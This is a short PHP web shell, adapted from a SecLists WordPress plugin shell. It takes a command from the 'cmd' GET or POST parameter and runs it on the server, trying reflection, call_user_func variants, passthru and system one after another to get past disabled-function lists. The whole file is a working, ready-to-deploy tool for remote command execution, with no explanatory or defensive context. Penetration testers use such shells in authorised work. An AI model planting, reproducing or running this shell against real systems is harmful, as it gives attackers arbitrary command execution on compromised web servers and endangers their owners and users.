<?php
   # Heavily borrowed from:
   # source: https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/WordPress/plugin-shell.php
   # located: /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php

# Name of the parameter (GET or POST) for the command. Change this if the target already use this parameter.
$cmd = 'cmd';

function executeCommand(string $command) {
   # Try to find a way to run our command using various PHP internals
   if (class_exists('ReflectionFunction')) {
      # http://php.net/manual/en/class.reflectionfunction.php
      $function = new ReflectionFunction('system');
      $function->invoke($command);
   } elseif (function_exists('call_user_func_array')) {
      # http://php.net/manual/en/function.call-user-func-array.php
      call_user_func_array('system', array($command));
   } elseif (function_exists('call_user_func')) {
      # http://php.net/manual/en/function.call-user-func.php
      call_user_func('system', $command);
   } else if(function_exists('passthru')) {
      # https://www.php.net/manual/en/function.passthru.php
      ob_start();
      passthru($command , $return_var);
      $output = ob_get_contents();
      ob_end_clean();
   } else if(function_exists('system')){
      # this is the last resort. chances are system() on a blacklist anyways :>
      # http://php.net/manual/en/function.system.php
      system($command);
   }
}

$command = $_REQUEST[$cmd];
executeCommand($command);

?>